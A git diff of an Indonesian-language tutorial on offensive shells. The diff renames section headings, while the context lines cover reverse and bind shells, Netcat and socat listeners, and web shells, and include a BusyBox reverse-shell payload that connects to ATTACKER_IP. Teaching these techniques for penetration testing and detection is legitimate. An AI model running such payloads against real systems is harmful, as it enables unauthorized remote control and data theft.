@@ -4,7 +4,7 @@
 - **Category:** Offensive Security Tooling
 - **Difficulty:** Easy
 
-## Task 1: Shellls Introduction
+## Shellls Introduction
 
 Shells dalam cybersecurity sering sekali dipakai oleh attackers buat ngontrol sistem dari jarak jauh (remote), yang bikin mereka jadi bagian penting dari rantai serangan (attack chain)., kita bakal eksplor berbagai jenis shells yang dipake dalam offensive security, bedanya apa aja, dan kapan pakainya. Pengetahuan ini bisa ngebantu ningkatin skill penetration testing dan exploitation, dan juga ngebantu kita paham gimana cara mendeteksi kalau ada remote shell yang lagi dipake attacker di dalam organisasi.
 
@@ -16,7 +16,7 @@ kita bakal bahas tujuan pembelajaran berikut:
 - Cara Setup dan Menggunakan Reverse dan Bind Shells
 - Deploy Web Shells
 
-## Task 2: Shells Overview
+## Shells Overview
 
 ### What is a Shell?
 
@@ -35,7 +35,7 @@ Banyak hal nakal yang bisa dilakuin kalau udah dapet shell:
 
 Intinya, semua jenis shell yang bakal kita bahas nanti tujuannya ya buat memfasilitasi aksi-aksi di atas ini.
 
-## Task 3: Reverse Shell
+## Reverse Shell
 
 ### Reverse Shell
 
@@ -113,7 +113,7 @@ Sekarang kita bisa ketik perintah di terminal kita, dan perintah itu bakal dieks
 
 Dari sini, kita bisa lanjut ke tahap berikutnya kayak **Privilege Escalation** atau **Data Exfiltration**.
 
-## Task 4: Bind Shell
+## Bind Shell
 
 ### Bind Shell
 
@@ -188,7 +188,7 @@ target@rootuser:~$
 
 Pas koneksi berhasil (`open`), kita langsung dapet shell Coba ketik perintah kayak `whoami` atau `ls`, pasti jalan di mesin target.
 
-## Task 5: Shells Listener
+## Shells Listener
 
 Seperti yang udah kita pelajari, reverse shell bakal connect dari target ke mesin attacker. Biasanya kita pake Netcat buat nangkep koneksinya, tapi Netcat bukan satu-satunya tools yang bisa dipake.
 
@@ -253,7 +253,7 @@ attacker@arch:~$ socat -d -d TCP-LISTEN:443 STDOUT
 
 Socat syntax nya agak beda dan lebih kompleks, tapi fiturnya jauh lebih canggih daripada Netcat biasa.
 
-## Task 6: Shells Payloads
+## Shells Payloads
 
 Shell Payload itu command atau script yang kita jalanin di target buat ngebuka akses shell. Bisa buat reverse shell (ngirim koneksi) atau bind shell (nunggu koneksi).
 
@@ -451,7 +451,7 @@ busybox nc ATTACKER_IP 443 -e sh
 - Payload ini sebenernya cuma manggil `nc` (Netcat) yang ada di dalem BusyBox.
 - `-e sh`: Execute shell setelah konek (fitur yang sering ilang di Netcat biasa, tapi ada di versi BusyBox).
 
-## Task 7: Web Shells
+## Web Shells
 
 **Web shell** itu script jahat yang ditulis pake bahasa pemrograman web (kayak PHP, ASP, JSP) yang diem-diem ditanam di web server korban. Tujuannya? Biar attacker bisa jalanin perintah sistem langsung lewat browser
 
